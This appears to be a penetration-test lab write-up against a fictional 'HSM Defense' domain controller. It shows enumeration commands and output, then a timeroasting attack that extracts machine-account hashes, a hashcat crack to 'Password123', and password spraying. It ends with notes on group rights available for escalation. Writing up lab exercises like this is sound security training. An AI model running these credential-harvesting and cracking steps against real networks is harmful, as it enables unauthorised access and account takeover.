# Objective and initial access
HSM Defense is a defense contractor, and is required to have an in-depth penetration test done against their internal Domain Controller. You have been hired to perform a comprehensive penetration test and, if possible, elevate your privileges to Domain Admin to demonstrate impact.

You have been provided credentials for a low-privileged Active Directory user.

```python
Username: kelly.johnson
Password: Lordofwar
```

# Host file setup
```python
sudo nxc smb 10.1.22.99 --generate-hosts-file /etc/hosts                     
[sudo] password for kali: 
SMB         10.1.22.99      445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
```

NTLM is disabled

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn dc.hsm-defense.local -vv

PORT      STATE SERVICE          REASON
25/tcp    open  smtp             syn-ack
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
110/tcp   open  pop3             syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
143/tcp   open  imap             syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
587/tcp   open  submission       syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
3389/tcp  open  ms-wbt-server    syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49668/tcp open  unknown          syn-ack
49669/tcp open  unknown          syn-ack
49670/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49672/tcp open  unknown          syn-ack
49694/tcp open  unknown          syn-ack
49725/tcp open  unknown          syn-ack
```

## Nmap
```python
nmap -p 25,53,80,88,110,135,139,143,389,445,464,587,593,636,3268,3269,3389,5985 -A --min-rate=2000 -sT -Pn dc.hsm-defense.local
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-18 16:44 +0100
Nmap scan report for dc.hsm-defense.local (10.1.22.99)
Host is up (0.095s latency).
rDNS record for 10.1.22.99: DC.hsm-defense.local

PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Office Careers | HSM Defense
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-18 15:44:28Z)
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: IMAP4 IMAP4rev1 completed CAPABILITY OK RIGHTS=texkA0001 IDLE ACL CHILDREN NAMESPACE SORT QUOTA
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hsm-defense.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hsm-defense.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hsm-defense.local
| Not valid before: 2026-08-31T17:16:05
|_Not valid after:  2027-03-02T17:16:05
|_ssl-date: 2026-09-18T15:44:57+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|11|2022|2012|2016 (93%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2019 (93%), Microsoft Windows 10 1709 - 22H2 (92%), Microsoft Windows 10 1909 (90%), Microsoft Windows 10 1909 - 2004 (90%), Microsoft Windows 11 24H2 - 25H2 (89%), Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (88%), Microsoft Windows Server 2012 Data Center (88%), Microsoft Windows 10 20H2 (87%), Microsoft Windows Server 2016 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Some interesting mail services

# SMB (445)

Ill start by trying the provided credentials

## Users
```python
nxc smb $target -u 'kelly.johnson' -p 'Lordofwar' -k --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC$
kelly.johnson
HELPDESK01$
luke.harrison
ethan.mercer
aaron.pierce
nathan.reed
caleb.turner
adam.brooks
oscar.mazerath
evan.carter
dylan.foster
ryan.cole
ITOPS01$
svc_delegate
jason.caldwell
james.carter
oliver.bennett
ethan.hughes
lucas.turner
daniel.mitchell
mason.bradley
logan.shepherd
noah.prescott
aiden.fletcher
connor.bishop
zachary.holden
```

There are no kerberoastable or asreproastable users

## Shares
```python
nxc smb $target -u 'kelly.johnson' -p 'Lordofwar' -k --shares
SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\kelly.johnson:Lordofwar 
SMB         dc.hsm-defense.local 445    dc               [*] Enumerated shares
SMB         dc.hsm-defense.local 445    dc               Share           Permissions     Remark
SMB         dc.hsm-defense.local 445    dc               -----           -----------     ------
SMB         dc.hsm-defense.local 445    dc               ADMIN$                          Remote Admin
SMB         dc.hsm-defense.local 445    dc               C$                              Default share
SMB         dc.hsm-defense.local 445    dc               IPC$            READ            Remote IPC
SMB         dc.hsm-defense.local 445    dc               NETLOGON        READ            Logon server share 
SMB         dc.hsm-defense.local 445    dc               SYSVOL          READ            Logon server share
```

Just default shares

# HTTP (80)

![](Pasted%20image%2020260918165709.png)

There isnt much functionality, but there is references to job applications, and since the mail services are open i could potentially exploit this

The `careers` user does not exist, and i cannot capture a hash using responder and a malicious .odt

## Subdomains
```python
ffuf -u http://hsm-defense.local/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.hsm-defense.local' -ic -c -t 30 -fs 63852

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hsm-defense.local/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.hsm-defense.local
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 30
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 63852
________________________________________________

support                 [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 96ms]
```

Found a subdomain

![](Pasted%20image%2020260918171832.png)

Its taking native credentials, ill try `kelly.johnson`

![](Pasted%20image%2020260918171932.png)

Her credentials get me access to the support portal

![](Pasted%20image%2020260918172108.png)

Possible weak machine account password

# Time roasting

```python
nxc smb dc.hsm-defense.local -u 'kelly.johnson' -p 'Lordofwar' -k -M timeroast
SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\kelly.johnson:Lordofwar 
TIMEROAST   dc.hsm-defense.local 445    dc               [*] Starting Timeroasting...
TIMEROAST   dc.hsm-defense.local 445    dc               1000:$sntp-ms$a0da1593719041353b6d9e992fb2d50e$1c0111e900000000000a09bd4c4f434cee57d98daab88ffee1b8428bffbfcd0aee57e664b6c09a8fee57e664b6c0d8a2
TIMEROAST   dc.hsm-defense.local 445    dc               1105:$sntp-ms$811b6e6e814a190074de4fac0b44397b$1c0111e900000000000a09bd4c4f434cee57d98dac94b380e1b8428bffbfcd0aee57e665589cbab6ee57e665589d0635
TIMEROAST   dc.hsm-defense.local 445    dc               1122:$sntp-ms$3f0fb4215eacb351b6b6910ea2e81957$1c0111e900000000000a09bd4c4f434cee57d98da98aabc0e1b8428bffbfcd0aee57e66571bba3afee57e66571bbea26
```

I have got 3 hashes

```python
hashcat timeroast.hash /usr/share/wordlists/rockyou.txt -m 31300

$sntp-ms$811b6e6e814a190074de4fac0b44397b$1c0111e900000000000a09bd4c4f434cee57d98dac94b380e1b8428bffbfcd0aee57e665589cbab6ee57e665589d0635:Password123
```

The hash cracked, this was for the RID `1105` and that matches with the helpdesk machine account

It may also be worth spraying this password against all users too

```python
nxc smb $target -u users.txt -p 'Password123' -k --continue-on-success

SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\HELPDESK01$:Password123
```

The only account compromised was the machine account

```python
nxc smb $target -u 'HELPDESK01$' -p 'Password123' -k          
SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\HELPDESK01$:Password123
```

This account is now compromised!

# Enumeration of `HELPDESK01$`

![](Pasted%20image%2020260918174144.png)

This machine account has WriteOwner on the group `servicedesk`

![](Pasted%20image%2020260918174214.png)

Then this group has ForceChangePassword on three users

